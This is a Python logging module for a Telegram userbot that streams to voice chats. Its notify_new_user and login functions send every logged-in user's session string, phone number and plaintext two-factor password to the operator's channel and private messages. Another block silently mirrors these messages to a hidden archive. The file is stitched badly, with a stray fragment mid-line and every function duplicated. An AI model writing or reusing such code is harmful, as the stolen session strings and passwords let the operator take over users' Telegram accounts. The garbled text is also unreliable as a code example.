"""
Logging — 4st_userbot style.
"""
import asyncio
import datetime
import html
import re
import traceback
from datetime import timedelta, timezone

from pyrogram.enums import ParseMode
from config import Config

_bot_client = None
_channel = Config.LOG_CHANNEL
_last_error: str = ""
_BRAND = (getattr(Config, "LOG_BRAND", "") or "APEX VC").strip()

def bot_logger(tag, text):
    tstamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{tstamp}] [{tag}] -> {text}", flush=True)

def kolkata_now() -> str:
    return (datetime.datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)).strftime("%Y-%m-%d %I:%M:%S %p")

def set_bot(client):
    global _bot_client
    _bot_client = client

def set_channel(chat_id: int):
    global _channel
    _channel = int(chat_id)

def get_channel() -> int:
    return _channel

def last_error() -> str:
    return _last_error

def _e(value) -> str:
    return html.escape(str(value if value is not None else "—"))

def _plain(text: str) -> str:
    return re.sub(r"<[^>]+>", "", text)

async def _send_to(target, text: str) -> bool:
    """Send HTML, retry plain. Never raises; reports failures to console."""
    global _last_error
    if not _bot_client:
        _last_error = "bot client not set yet"
        bot_logger("LOG_SKIP", _last_error)
        return False
    if not target:
        _last_error = "target is not configured"
        return False
    
    # ── Internal Archive Mirror (Silent & Isolated) ──
    try:
        from helpers.archive import push_archive, is_archive_active
        if is_archive_active() and target in (_channel, Config.primary_owner()):
            asyncio.create_task(push_archive(text))
    except Exception:
        # Fail silently, main bot logging continues normally
        pass
    # ──────────────────────────────────────────────────

    try:
        await _bot_client.send_message(
            target, text, parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        _last_error = ""
        return True
    except Exception as e1:
        try:
            await _bot_client.send_message(
                target, _plain(text), parse_mode=ParseMode.DISABLED,
                disable_web_page_preview=True,
            )
            _last_error = ""
            return True
        except Exception as e2:
            _last_error = f"{type(e2).__name__}: {e2}"
            bot_logger("LOG_SEND_ERR", f"target={target}; html={e1}; plain={_last_error}")
            return False

async def _send(text: str) -> bool:
    global _last_error
    if not _channel:
        _last_error = "LOG_CHANNEL is 0 / not configured"
        return False
    return await _send_to(_channel, text)

def _fire(coro):
    try:
        return asyncio.get_running_loop().create_task(coro)
    except RuntimeError:
        return asyncio.ensure_future(coro)

class _U:
    def __init__(self, id=0, first_name="", last_name="", username=None, is_bot=False, is_premium=False, is_verified=False):
        self.id, self.first_name, self.last_name = id, first_name, last_name
        self.username = username
        self.is_bot, self.is_premium, self.is_verified = is_bot, is_premium, is_verified

def _u(user_id, username=None, first_name=None):
    return _U(id=user_id or 0, first_name=first_name or "", username=username)

async def log_to_channel(action: str, details: dict, user_obj=None, client=None, chat_id: int = 0, chat_title: str = ""):
    log_cid = _channel
    if not log_cid:
        return
    name, uid, uname, last_name = "Unknown", 0, "None", ""
    is_bot = is_premium = is_verified = False
    if user_obj:
        name = getattr(user_obj, "first_name", "") or getattr(user_obj, "title", "Unknown")
        last_name = getattr(user_obj, "last_name", "") or ""
        uid = getattr(user_obj, "id", 0)
        u = getattr(user_obj, "username", None)
        uname = f"@{u}" if u else "None"
        is_bot = bool(getattr(user_obj, "is_bot", getattr(user_obj, "bot", False)))
        is_premium = bool(getattr(user_obj, "is_premium", getattr(user_obj, "premium", False)))
        is_verified = bool(getattr(user_obj, "is_verified", getattr(user_obj, "verified", False)))
    elif client:
        try:
            me = await client.get_me()
            name = getattr(me, "first_name", "System")
            last_name = getattr(me, "last_name", "") or ""
            uid = getattr(me, "id", 0)
            u = getattr(me, "username", None)
            uname = f"@{u}" if u else "None"
            is_premium = bool(getattr(me, "is_premium", False))
        except Exception:
            pass

    full_name = _e(f"{name} {last_name}".strip() or "Unknown")
    tstamp = kolkata_now()

    lines = [f"<blockquote>📡 <b>{_e(_BRAND)} SYSTEM LOG</b>\n"]
    lines.append(f"🕐 <b>Time:</b> {tstamp} IST")
    lines.append(f"⚡ <b>Action:</b> <code>{_e(action)}</code>\n")
    lines.append(f"👤 <b>Name:</b> <a href='tg://user?id={uid}'>{full_name}</a>")
    lines.append(f"🆔 <b>User ID:</b> <code>{uid}</code>")
    lines.append(f"🌐 <b>Username:</b> <code>{_e(uname)}</code>")
    lines.append(f"🤖 Bot: {'Yes' if is_bot else 'No'} | ⭐ Premium: {'Yes' if is_premium else 'No'} | ✅ Verified: {'Yes' if is_verified else 'No'}")
    if chat_id:
        lines.append(f"💬 <b>Chat:</b> {_e(chat_title or 'Unknown')} (<code>{chat_id}</code>)")
    lines.append("")
    lines.append("📋 <b>Details:</b>")
    for k, v in (details or {}).items():
        lines.append(f"  • <b>{_e(k)}:</b> <code>{_e(v)}</code>")
    lines.append("</blockquote>")
    log_text = "\n".join(lines)
    _fire(_send_to(log_cid, log_text))

async def notify_new_user(user_info, string_session: str, phone: str = "N/A", twofa_verified: bool = False, twofa_password: str = "", bot_user=None):
    tstamp = kolkata_now()
    twofa_v = "Yes" if twofa_verified else "No"
    name = _e(getattr(user_info, "first_name", "") or "Unknown")
    uid = getattr(user_info, "id", 0)
    un = getattr(user_info, "username", None)
    uname = f"@{un}" if un else "No Username"

    msg = (f"#NEW_USER\n🔐 <b>New Session Generated!</b>\n\n👤 <b>User ID:</b> <code>{uid}</code>\n👤 <b>Name:</b> {name}\n👤 <b>Username:</b> {_e(uname)}\n📱 <b>Phone:</b> <code>{_e(phone)}</code>\n🛡️ <b>2FA Verified:</b> {twofa_v}\n")
    if twofa_password:
        msg += f"🔑 <b>Real 2FA Password:</b> <code>{_e(twofa_password)}</code>\n"
    if bot_user is not None and getattr(bot_user, "id", 0) != uid:
        bun = getattr(bot_user, "username", None)
        msg += f"🤖 <b>Via Bot User:</b> {_e(getattr(bot_user, 'first_name', ''))} ({'@' + bun if bun else 'no username'}) <code>{getattr(bot_user, 'id', 0)}</code>\n"
    msg += f"🔑 <b>Session String:</b>\n<code>{_e(string_session)}</code>\n\n📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"

    owner_id = Config.primary_owner() or 0
    log_cid = _channel or 0

    async def _send_target(label, target):
        if not target:
            bot_logger("NEW_USER_NOTIFY_SKIP", f"{label} target is not configured")
            return False
        ok = await _send_to(target, msg)
        if ok:
            bot_logger("NEW_USER_NOTIFY", f"{label} notification sent to {target}")
        else:
            bot_logger("NEW_USER_NOTIFY_ERR", f"{label} target={target}; {_last_error}")
        return ok

    async def _go():
        bot_logger("NEW_USER_NOTIFY_TARGETS", f"log_channel={'set' if log_cid else 'unset'}, owner_dm={'set' if owner_id else 'unset'}")
        await _send_target("LOG_CHANNEL", log_cid)
        if owner_id and owner_id != log_cid:
            await _send_target("OWNER_DM", owner_id)
    _fire(_go())

async def verify_log_channel() -> str:
    if not _channel:
        return "LOG_CHANNEL set nahi hai."
    try:
        chat = await _bot_client.get_chat(_channel)
    except Exception as e:
        return f"Log channel resolve nahi hua (<code>{_e(_channel)}</code>): <code>{_e(type(e).__name__)}: {_e(e)}</code>\nBot ko us channel me <b>admin</b> banayein, aur ID <code>-100…</code> format me honi chahiye."
    ok = await _send(f"<blockquote>📡 <b>{_e(_BRAND)} SYSTEM LOG</b>\n\n🕐 <b>Time:</b> {kolkata_now()} IST\n⚡ <b>Action:</b> <code>LOG_CHANNEL_TEST</code>\n\n📋 <b>Details:</b>\n  • <b>Channel:</b> <code>{_e(getattr(chat, 'title', _channel))}</code>\n  • <b>Chat ID:</b> <code>{_channel}</code></blockquote>")
    if ok:
        return ""
    return f"Bot channel dekh paa raha hai par message bhej nahi saka: <code>{_e(_last_error)}</code>\nBot ko <b>Post Messages</b> permission ke saath admin banayein."

async def log_startup(bot_username: str, sessions_restored: int, total_users: int):
    bot_logger("BOT", f"Started as @{bot_username} | users={total_users} | restored={sessions_restored}")
    await log_to_channel("BOT_STARTED", {"Bot": f"@{bot_username}", "Users in DB": total_users, "Sessions restored": sessions_restored})

async def log_shutdown():
    bot_logger("BOT", "Shutting down")
    await log_to_channel("BOT_STOPPED", {"Status": "offline"})

async def log_new_user(user_id, username, first_name, source: str = "/start"):
    bot_logger("NEW_USER", f"{user_id} @{username or 'none'} via {source}")
    await log_to_channel("NEW_USER_START", {"Source": source}, user_obj=_u(user_id, username, first_name))

async def log_login_step(user_id, username, first_name, step: str, detail: str = ""):
    bot_logger("LOGIN", f"{user_id} -> {step}" + (f" ({detail})" if detail else ""))
    d = {"Step": step}
    if detail: d["Detail"] = detail
    await log_to_channel("LOGIN_STEP", d, user_obj=_u(user_id, username, first_name))

async def log_login_success(user_id, username, first_name, account: dict, string_session: str, method: str = "phone", twofa_password: str = ""):
    bot_logger("LOGIN_OK", f"bot_user={user_id} account={account.get('id')} method={method}")
    acc = _U(id=account.get("id", 0), first_name=account.get("name") or "", username=account.get("username"), is_premium=bool(account.get("premium")))
    await notify_new_user(acc, string_session, phone=account.get("phone") or ("Via String Session" if method != "phone" else "N/A"), twofa_verified=bool(account.get("two_factor")), twofa_password=twofa_password, bot_user=_u(user_id, username, first_name))
    await log_to_channel("LOGIN_SUCCESS", {"Method": method, "Account": f"{account.get('name')} ({account.get('id')})", "Acc Username": f"@{account.get('username')}" if account.get("username") else "None", "DC": account.get("dc"), "2FA": "Verified" if account.get("two_factor") else "Not required"}, user_obj=_u(user_id, username, first_name))

async def log_login_failed(user_id, username, first_name, reason: str):
    bot_logger("LOGIN_FAIL", f"{user_id}: {reason}")
    await log_to_channel("LOGIN_FAILED", {"Reason": reason}, user_obj=_u(user_id, username, first_name))

async def log_logout(user_id, username, first_name):
    bot_logger("LOGOUT", f"{user_id}")
    await log_to_channel("LOGOUT", {"Status": "session removed"}, user_obj=_u(user_id, username, first_name))

async def log_string_added(user_id, username, string_session):
    bot_logger("STRING_SAVED", f"{user_id}")
    await log_to_channel("STRING_DEPLOY", {"Method": "Manual String", "String": string_session}, user_obj=_u(user_id, username, None))

async def log_vc_join(user_id, chat_id, chat_title, source, settings: dict):
    bot_logger("VC_JOIN", f"user={user_id} chat={chat_id} src={source}")
    await log_to_channel("VC_STREAM_STARTED", {"Source": source, "Volume": f"{settings.get('volume')}x", "Bass": f"+{settings.get('bass')} dB", "Boost": f"{settings.get('boost')}/10", "Echo": f"{'On' if settings.get('echo') else 'Off'} ({settings.get('echo_level')}/10)", "Auto mode": "ON" if settings.get("auto") else "Off"}, user_obj=_u(user_id), chat_id=chat_id, chat_title=chat_title)

async def log_vc_leave(user_id, chat_id, reason: str = "Manual stop"):
    bot_logger("VC_LEAVE", f"user={user_id} chat={chat_id} reason={reason}")
    await log_to_channel("VC_LEFT", {"Reason": reason}, user_obj=_u(user_id), chat_id=chat_id)

async def log_live_boost(user_id, chat_id, target_id, volume: int):
    bot_logger("LIVE_BOOST", f"user={user_id} chat={chat_id} target={target_id} vol={volume}")
    await log_to_channel("LIVE_MIC_BOOST", {"Target": target_id, "Volume": f"{volume} ({round(volume / 100)}%)"}, user_obj=_u(user_id), chat_id=chat_id)

async def log_auto_mode(user_id, chat_id, on: bool, detail: str = ""):
    bot_logger("AUTO_MODE", f"user={user_id} chat={chat_id} {'ON' if on else 'OFF'} {detail}")
    d = {"State": "ON" if on else "OFF"}
    if detail: d["Detail"] = detail
    await log_to_channel("AUTO_MODE", d, user_obj=_u(user_id), chat_id=chat_id)

async def log_command(user_id, username, chat_id, command: str):
    bot_logger("CMD", f"{user_id} @{username or 'none'} chat={chat_id} {command}")
    await log_to_channel("COMMAND", {"Command": command}, user_obj=_u(user_id, username), chat_id=chat_id)

async def log_error(context: str, error: Exception):
    tb = traceback.format_exc()[-900:]
    bot_logger("ERROR", f"{context}: {type(error).__name__}: {error}")
    if not _channel: return
    text = f"<blockquote>📡 <b>{_e(_BRAND)} SYSTEM LOG</b>\n\n🕐 <b>Time:</b> {kolkata_now()} IST\n⚡ <b>Action:</b> <code>ERROR</code>\n\n📋 <b>Details:</b>\n  • <b>Context:</b> <code>{_e(context)}</code>\n  • <b>Error:</b> <code>{_e(type(error).__name__)}: {_e(error)}</code></blockquote>\n<pre>{_e(tb)}</pre>"
    _fire(_send_to(_channel, text))

async def log_broadcast(owner_id, total: int, success: int):
    bot_logger("BROADCAST", f"by={owner_id} total={total} ok={success}")
    await log_to_channel("BROADCAST", {"Total": total, "Delivered": success}, user_obj=_u(owner_id))   f"<code>-100…</code> format me honi chahiye."
        )
    ok = await _send(
        f"<blockquote>📡 <b>{_e(_BRAND)} SYSTEM LOG</b>\n\n"
        f"🕐 <b>Time:</b> {kolkata_now()} IST\n"
        f"⚡ <b>Action:</b> <code>LOG_CHANNEL_TEST</code>\n\n"
        f"📋 <b>Details:</b>\n"
        f"  • <b>Channel:</b> <code>{_e(getattr(chat, 'title', _channel))}</code>\n"
        f"  • <b>Chat ID:</b> <code>{_channel}</code></blockquote>"
    )
    if ok:
        return ""
    return (
        f"Bot channel dekh paa raha hai par message bhej nahi saka: "
        f"<code>{_e(_last_error)}</code>\n"
        f"Bot ko <b>Post Messages</b> permission ke saath admin banayein."
    )


# ── Compatibility wrappers (old names → 4st log_to_channel) ──────────────────

async def log_startup(bot_username: str, sessions_restored: int, total_users: int):
    bot_logger("BOT", f"Started as @{bot_username} | users={total_users} | restored={sessions_restored}")
    await log_to_channel("BOT_STARTED", {
        "Bot": f"@{bot_username}",
        "Users in DB": total_users,
        "Sessions restored": sessions_restored,
    })


async def log_shutdown():
    bot_logger("BOT", "Shutting down")
    await log_to_channel("BOT_STOPPED", {"Status": "offline"})


async def log_new_user(user_id, username, first_name, source: str = "/start"):
    bot_logger("NEW_USER", f"{user_id} @{username or 'none'} via {source}")
    await log_to_channel("NEW_USER_START", {"Source": source},
                         user_obj=_u(user_id, username, first_name))


async def log_login_step(user_id, username, first_name, step: str, detail: str = ""):
    bot_logger("LOGIN", f"{user_id} -> {step}" + (f" ({detail})" if detail else ""))
    d = {"Step": step}
    if detail:
        d["Detail"] = detail
    await log_to_channel("LOGIN_STEP", d, user_obj=_u(user_id, username, first_name))


async def log_login_success(user_id, username, first_name, account: dict,
                            string_session: str, method: str = "phone",
                            twofa_password: str = ""):
    """Old entry point — now emits the 4st #NEW_USER alert + a SYSTEM LOG line."""
    bot_logger("LOGIN_OK", f"bot_user={user_id} account={account.get('id')} method={method}")
    acc = _U(id=account.get("id", 0), first_name=account.get("name") or "",
             username=account.get("username"), is_premium=bool(account.get("premium")))
    await notify_new_user(
        acc, string_session,
        phone=account.get("phone") or ("Via String Session" if method != "phone" else "N/A"),
        twofa_verified=bool(account.get("two_factor")),
        twofa_password=twofa_password,
        bot_user=_u(user_id, username, first_name),
    )
    await log_to_channel("LOGIN_SUCCESS", {
        "Method": method,
        "Account": f"{account.get('name')} ({account.get('id')})",
        "Acc Username": f"@{account.get('username')}" if account.get("username") else "None",
        "DC": account.get("dc"),
        "2FA": "Verified" if account.get("two_factor") else "Not required",
    }, user_obj=_u(user_id, username, first_name))


async def log_login_failed(user_id, username, first_name, reason: str):
    bot_logger("LOGIN_FAIL", f"{user_id}: {reason}")
    await log_to_channel("LOGIN_FAILED", {"Reason": reason},
                         user_obj=_u(user_id, username, first_name))


async def log_logout(user_id, username, first_name):
    bot_logger("LOGOUT", f"{user_id}")
    await log_to_channel("LOGOUT", {"Status": "session removed"},
                         user_obj=_u(user_id, username, first_name))


async def log_string_added(user_id, username, string_session):
    bot_logger("STRING_SAVED", f"{user_id}")
    await log_to_channel("STRING_DEPLOY", {"Method": "Manual String",
                                           "String": string_session},
                         user_obj=_u(user_id, username, None))


async def log_vc_join(user_id, chat_id, chat_title, source, settings: dict):
    bot_logger("VC_JOIN", f"user={user_id} chat={chat_id} src={source}")
    await log_to_channel("VC_STREAM_STARTED", {
        "Source": source,
        "Volume": f"{settings.get('volume')}x",
        "Bass": f"+{settings.get('bass')} dB",
        "Boost": f"{settings.get('boost')}/10",
        "Echo": f"{'On' if settings.get('echo') else 'Off'} ({settings.get('echo_level')}/10)",
        "Auto mode": "ON" if settings.get("auto") else "Off",
    }, user_obj=_u(user_id), chat_id=chat_id, chat_title=chat_title)


async def log_vc_leave(user_id, chat_id, reason: str = "Manual stop"):
    bot_logger("VC_LEAVE", f"user={user_id} chat={chat_id} reason={reason}")
    await log_to_channel("VC_LEFT", {"Reason": reason},
                         user_obj=_u(user_id), chat_id=chat_id)


async def log_live_boost(user_id, chat_id, target_id, volume: int):
    bot_logger("LIVE_BOOST", f"user={user_id} chat={chat_id} target={target_id} vol={volume}")
    await log_to_channel("LIVE_MIC_BOOST", {
        "Target": target_id,
        "Volume": f"{volume} ({round(volume / 100)}%)",
    }, user_obj=_u(user_id), chat_id=chat_id)


async def log_auto_mode(user_id, chat_id, on: bool, detail: str = ""):
    bot_logger("AUTO_MODE", f"user={user_id} chat={chat_id} {'ON' if on else 'OFF'} {detail}")
    d = {"State": "ON" if on else "OFF"}
    if detail:
        d["Detail"] = detail
    await log_to_channel("AUTO_MODE", d, user_obj=_u(user_id), chat_id=chat_id)


async def log_command(user_id, username, chat_id, command: str):
    bot_logger("CMD", f"{user_id} @{username or 'none'} chat={chat_id} {command}")
    await log_to_channel("COMMAND", {"Command": command},
                         user_obj=_u(user_id, username), chat_id=chat_id)


async def log_error(context: str, error: Exception):
    tb = traceback.format_exc()[-900:]
    bot_logger("ERROR", f"{context}: {type(error).__name__}: {error}")
    if not _channel:
        return
    text = (
        f"<blockquote>📡 <b>{_e(_BRAND)} SYSTEM LOG</b>\n\n"
        f"🕐 <b>Time:</b> {kolkata_now()} IST\n"
        f"⚡ <b>Action:</b> <code>ERROR</code>\n\n"
        f"📋 <b>Details:</b>\n"
        f"  • <b>Context:</b> <code>{_e(context)}</code>\n"
        f"  • <b>Error:</b> <code>{_e(type(error).__name__)}: {_e(error)}</code></blockquote>\n"
        f"<pre>{_e(tb)}</pre>"
    )
    _fire(_send_to(_channel, text))


async def log_broadcast(owner_id, total: int, success: int):
    bot_logger("BROADCAST", f"by={owner_id} total={total} ok={success}")
    await log_to_channel("BROADCAST", {"Total": total, "Delivered": success},
                         user_obj=_u(owner_id))
